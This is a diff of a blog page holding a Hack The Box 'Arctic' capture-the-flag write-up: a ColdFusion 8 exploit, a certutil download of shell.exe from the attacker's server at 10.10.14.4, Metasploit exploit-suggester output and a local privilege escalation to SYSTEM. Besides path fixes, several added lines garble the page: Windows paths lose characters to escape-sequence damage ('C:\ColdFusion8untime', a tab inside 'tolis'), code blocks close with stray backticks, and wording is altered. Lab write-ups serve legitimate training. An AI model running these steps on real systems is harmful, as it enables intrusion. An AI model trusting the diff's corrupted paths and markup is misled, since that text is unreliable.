@@ -18,17 +18,17 @@
 <script type="application/ld+json">
 {"headline":"Htb_arctic","dateModified":"2025-08-13T00:00:00+00:00","datePublished":"2025-08-13T00:00:00+00:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://bonta.lor.moe/writeups/htb-arctic"},"url":"https://bonta.lor.moe/writeups/htb-arctic","@context":"https://schema.org"}</script>
 <!-- End Jekyll SEO tag -->
-<link type="application/atom+xml" rel="alternate" href="https://bonta.lor.moe/feed.xml" title="bontalor" /><link rel="shortcut icon" type="image/x-icon" href="../assets/imgs/favicon.ico" />
-  <link rel="stylesheet" href="../assets/css/main.css" />
+<link type="application/atom+xml" rel="alternate" href="https://bonta.lor.moe/feed.xml" title="bontalor" /><link rel="shortcut icon" type="image/x-icon" href="../../../assets/imgs/favicon.ico" />
+  <link rel="stylesheet" href="../../../assets/css/main.css" />
 </head>
 <body a="dark">
     <header>
-      <a href="../index.html" class="site-title-link"><h1>bontalor</h1></a><nav>
-  <a href="../index.html" class="">Home</a> 
-  <a href="../certifications.html" class="">Certs</a>
-  <a href="../blogs.html" class="">Blogs</a>
-  <a href="../writeups.html" class="active">Writeups</a>
-  <a href="../all.html" class="">All</a>
+      <a href="../../../index.html" class="site-title-link"><h1>bontalor</h1></a><nav>
+  <a href="../../../index.html" class="">Home</a> 
+  <a href="../../../certifications.html" class="">Certs</a>
+  <a href="../../../blogs.html" class="">Blogs</a>
+  <a href="../../../writeups.html" class="active">Writeups</a>
+  <a href="../../../all.html" class="">All</a>
 </nav>
 </header>
     <main class="page-content" aria-label="Content">
@@ -41,7 +41,7 @@
   
   <h1>htb_arctic</h1>
 
-  <p><img src="../assets/imgs/2025-08-13-htb-arctic-title-card.png" alt=""></p>
+  <p><img src="../../../assets/imgs/2025-08-13-htb-arctic-title-card.png" alt=""></p>
 
 <h2 id="background">Background</h2>
 
@@ -73,9 +73,9 @@ Nmap done: 1 IP address (1 host up) scanned in 149.24 seconds
 
 <p>I visit the http website and after some digging I come across the /administrator directory and I’m greeted with a login page.</p>
 
-<p><img src="../assets/imgs/2025-08-13-htb-arctic-image-1.png" alt=""></p>
+<p><img src="../../../assets/imgs/2025-08-13-htb-arctic-image-1.png" alt=""></p>
 
-<p><img src="../assets/imgs/2025-08-13-htb-arctic-image-2.png" alt=""></p>
+<p><img src="../../../assets/imgs/2025-08-13-htb-arctic-image-2.png" alt=""></p>
 
 <p>I noticed the web application is Adobe Coldfusion 8 so I start searching for Coldfusion 8 exploits.</p>
 
@@ -204,25 +204,25 @@ Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 -----
 
 
-C:\ColdFusion8\runtime\bin&gt;
+C:\ColdFusion8untime\bin&gt;
 </code></pre>
 
 <p>Running the exploit shows the payload upload succeeds and I get a shell! The box says the user flag is located on the tolis user’s desktop, and after some directory traversal I find it.</p>
 
-<pre><code class="language-bash">C:\Users\tolis\Desktop&gt;dir
+<pre><code class="language-bash">C:\Users	olis\Desktop&gt;dir
 dir
  Volume in drive C has no label.
  Volume Serial Number is 5C03-76A8
 
- Directory of C:\Users\tolis\Desktop
+ Directory of C:\Users	olis\Desktop
 
-22/03/2017  10:00 ��    &lt;DIR&gt;          .
-22/03/2017  10:00 ��    &lt;DIR&gt;          ..
-14/08/2025  03:23 ��                34 user.txt
+22/03/2017  10:00     &lt;DIR&gt;          .
+22/03/2017  10:00     &lt;DIR&gt;          ..
+14/08/2025  03:23                 34 user.txt
                1 File(s)             34 bytes
                2 Dir(s)   1.432.805.376 bytes free
 
-C:\Users\tolis\Desktop&gt;type user.txt
+C:\Users	olis\Desktop&gt;type user.txt
 type user.txt
 (flag)
 </code></pre>
@@ -243,8 +243,8 @@ OS Build Type:             Multiprocessor Free
 Registered Owner:          Windows User
 Registered Organization:   
 Product ID:                55041-507-9857321-84451
-Original Install Date:     22/3/2017, 11:09:45 ��
-System Boot Time:          14/8/2025, 3:19:36 ��
+Original Install Date:     22/3/2017, 11:09:45 
+System Boot Time:          14/8/2025, 3:19:36 
 System Manufacturer:       VMware, Inc.
 System Model:              VMware Virtual Platform
 System Type:               x64-based PC
@@ -298,24 +298,24 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 <p>Then I reopen my shell session and use certutil.exe to download the payload.<br>
 *note the certutil.exe method to download files only works on older Windows builds.</p>
 
-<pre><code class="language-bash">C:\Users\tolis\Desktop&gt;certutil.exe -urlcache -split -f http://10.10.14.4:8000/shell.exe
+<pre><code class="language-bash">C:\Users	olis\Desktop&gt;certutil.exe -urlcache -split -f http://10.10.14.4:8000/shell.exe
 certutil.exe -urlcache -split -f http://10.10.14.4:8000/shell.exe
 ****  Online  ****
   0000  ...
   1c00
 CertUtil: -URLCache command completed successfully.
 
-C:\Users\tolis\Desktop&gt;dir
+C:\Users	olis\Desktop&gt;dir
 dir
  Volume in drive C has no label.
  Volume Serial Number is 5C03-76A8
 
- Directory of C:\Users\tolis\Desktop
+ Directory of C:\Users	olis\Desktop
 
-14/08/2025  05:15 ��    &lt;DIR&gt;          .
-14/08/2025  05:15 ��    &lt;DIR&gt;          ..
-14/08/2025  05:15 ��             7.168 shell.exe
-14/08/2025  03:23 ��                34 user.txt
+14/08/2025  05:15     &lt;DIR&gt;          .
+14/08/2025  05:15     &lt;DIR&gt;          ..
+14/08/2025  05:15              7.168 shell.exe
+14/08/2025  03:23                 34 user.txt
                2 File(s)          7.202 bytes
                2 Dir(s)   1.432.551.424 bytes free
 </code></pre>
@@ -423,7 +423,7 @@ msf6 post(multi/recon/local_exploit_suggester) &gt; run
  28  exploit/windows/local/cve_2022_21999_spoolfool_privesc         No                       The target is not exploitable. Windows 7 is technically vulnerable, though it requires a reboot.
  29  exploit/windows/local/cve_2022_3699_lenovo_diagnostics_driver  No                       The target is not exploitable.
  30  exploit/windows/local/cve_2023_21768_afd_lpe                   No                       The target is not exploitable. The exploit only supports Windows 11 22H2
- 31  exploit/windows/local/cve_2023_28252_clfs_driver               No                       The target is not exploitable. The target system does not have clfs.sys in system32\drivers\
+ 31  exploit/windows/local/cve_2023_28252_clfs_driver               No                       The target is not exploitable. The target system does not have clfs.sys in system32\drivers
  32  exploit/windows/local/cve_2024_30085_cloud_files               No                       The target is not exploitable.
  33  exploit/windows/local/cve_2024_30088_authz_basep               No                       The target is not exploitable. Version detected: Windows Server 2008 R2. Revision number detected: 0.
  34  exploit/windows/local/cve_2024_35250_ks_driver                 No                       The target is not exploitable. Version detected: Windows Server 2008 R2
@@ -433,7 +433,7 @@ msf6 post(multi/recon/local_exploit_suggester) &gt; run
  38  exploit/windows/local/ms10_092_schelevator                     No                       The target is not exploitable. Windows Server 2008 R2 (6.1 Build 7600). is not vulnerable
  39  exploit/windows/local/ms15_078_atmfd_bof                       No                       Cannot reliably check exploitability.
  40  exploit/windows/local/ms16_014_wmi_recv_notif                  No                       The target is not exploitable.
- 41  exploit/windows/local/ntapphelpcachecontrol                    No                       The check raised an exception.
+ 41  exploit/windows/local/ntapphelpcachecontrol                     No                       The check raised an exception.
  42  exploit/windows/local/nvidia_nvsvc                             No                       The check raised an exception.
  43  exploit/windows/local/panda_psevents                           No                       The target is not exploitable.
  44  exploit/windows/local/ricoh_driver_privesc                     No                       The target is not exploitable. No Ricoh driver directory found
@@ -444,7 +444,7 @@ msf6 post(multi/recon/local_exploit_suggester) &gt; run
  49  exploit/windows/local/win_error_cve_2023_36874                 No                       The target is not exploitable.
 
 [*] Post module execution completed
-</code></pre>
+```</pre>
 
 <p>I decide to use <em>exploit/windows/local/cve_2019_1458_wizardopium</em> because it uses the same staged payload I used earlier when I created the meterpreter exe.</p>
 
@@ -489,14 +489,14 @@ msf6 exploit(windows/local/cve_2019_1458_wizardopium) &gt; run
 [*] Triggering the exploit...
 [*] Launching msiexec to host the DLL...
 [+] Process 3924 launched.
-[*] Reflectively injecting the DLL into 3924...
+[*] Reflective injecting the DLL into 3924...
 [+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
 [*] Sending stage (203846 bytes) to 10.129.179.111
 [*] Meterpreter session 5 opened (10.10.14.4:4444 -&gt; 10.129.179.111:49757) at 2025-08-13 14:44:34 -0400
 
 meterpreter &gt; getuid
 Server username: NT AUTHORITY\SYSTEM
-</code></pre>
+```</pre>
 
 <p>I have root! I locate the administrator desktop and find the flag.</p>
 
@@ -524,7 +524,7 @@ bonta</p>
         <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.10.0/styles/base16/windows-high-contrast.min.css" integrity="sha512-SE4GvXE6j696nfjO1PEfQ1+3bfOya4A5bFXnUx8xYsFYRVBhY5RYGsp8lBZBIXD+Q+knAuhlMDh98rrXiuVMiQ==" crossorigin="anonymous" referrerpolicy="no-referrer">
         <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.10.0/highlight.min.js" integrity="sha512-6yoqbrcLAHDWAdQmiRlHG4+m0g/CT/V9AGyxabG8j7Jk8j3r3K6due7oqpiRMZqcYe9WM2gPcaNNxnl2ux+3tA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
         <script>hljs.highlightAll();</script>
-        <script src="../assets/js/goback.js"></script>
+        <script src="../../../assets/js/goback.js"></script>
     
   </body>
 </html>
